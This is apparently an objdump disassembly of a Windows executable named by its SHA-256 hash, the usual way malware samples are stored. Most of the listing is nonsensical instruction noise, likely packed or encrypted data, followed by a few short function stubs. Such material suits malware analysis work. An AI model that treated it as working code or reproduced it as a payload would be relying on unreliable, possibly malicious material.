
3bbf1ffc737910c289874c6fb1b5692541e3193481d07e6e56588ad31f54a29e.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	mov    cs,esi
  4d0002:	cmp    al,0xc9
  4d0004:	push   ss
  4d0005:	jne    0x4cffb8
  4d0007:	or     eax,0xa9a2ade6
  4d000c:	or     al,0x73
  4d000e:	push   edx
  4d000f:	mov    ecx,0xfd6c91b
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0724
  4d06c1:	sub    eax,0xee47e44f
  4d06c6:	push   ecx
  4d06c7:	pop    ecx
  4d06c8:	cmp    BYTE PTR [esi+0x7],0xca
  4d06cc:	xor    ch,ch
  4d06ce:	dec    edx
  4d06cf:	repnz std 
  4d06d1:	sbb    BYTE PTR [eax-0x6f],0xa9
  4d06d5:	mov    gs:0xc97b64b2,eax
  4d06db:	pop    ebx
  4d06dc:	lock jae 0x4d0715
  4d06df:	pop    esi
  4d06e0:	push   esp
  4d06e1:	xor    DWORD PTR [ecx],0xffffff96
  4d06e4:	adc    al,0x10
  4d06e6:	cld    
  4d06e7:	jns    0x4d06cb
  4d06e9:	jb     0x4d0690
  4d06eb:	add    al,0x8b
  4d06ed:	call   DWORD PTR [ebp-0x75]
  4d06f0:	in     al,dx
  4d06f1:	sub    esp,0x1c
  4d06f4:	mov    ebx,0x4d3068
  4d06f9:	cmp    ebx,0x6174
  4d06ff:	je     0x4d06ef
  4d0701:	push   0x0
  4d0703:	call   0x4d1028
  4d0708:	add    esp,0x4
  4d070b:	push   ebx
  4d070c:	push   edx
  4d070d:	push   DWORD PTR [ebx+0x38]
  4d0710:	call   0x4d1090
  4d0715:	add    esp,0x8
  4d0718:	pop    ebx
  4d0719:	push   0x0
  4d071b:	call   0x4d101c
  4d0720:	add    esp,0x4
  4d0723:	add    esp,0x1c
  4d0726:	pop    ebp
  4d0727:	ret    
  4d0728:	pop    edi
  4d0729:	call   DWORD PTR ds:0x4d2010
  4d072f:	call   edi
  4d0731:	add    BYTE PTR [eax],al
  4d0733:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0739:	sub    esp,0x3c
  4d073c:	lea    ecx,[edx-0x190]
  4d0742:	add    DWORD PTR [ecx+0x10],esi
  4d0745:	push   ecx
  4d0746:	mov    ecx,0x0
  4d074b:	push   ecx
  4d074c:	call   0x4d1028
  4d0751:	add    esp,0x4
  4d0754:	pop    ecx
  4d0755:	push   ecx
  4d0756:	push   esi
  4d0757:	push   esi
  4d0758:	push   DWORD PTR [ecx+0x1c]
  4d075b:	push   DWORD PTR [ecx+0x48]
  4d075e:	call   0x4d0d74
  4d0763:	add    esp,0x10
  4d0766:	pop    ecx
  4d0767:	push   ecx
  4d0768:	push   0x0
  4d076a:	call   0x4d101c
  4d076f:	add    esp,0x4
  4d0772:	pop    ecx
  4d0773:	add    esp,0x3c
  4d0776:	pop    ebp
  4d0777:	ret    
  4d0778:	mov    edi,edi
  4d077a:	push   ebp
  4d077b:	mov    ebp,esp
  4d077d:	sub    esp,0x38
  4d0780:	lea    edx,ds:0x4d31cc
  4d0786:	and    DWORD PTR [edx-0xf0],0x32
  4d078d:	push   edx
  4d078e:	mov    edi,0x0
  4d0793:	push   edi
  4d0794:	call   0x4d1400
  4d0799:	add    esp,0x4
  4d079c:	pop    edx
  4d079d:	push   edx
  4d079e:	push   ebx
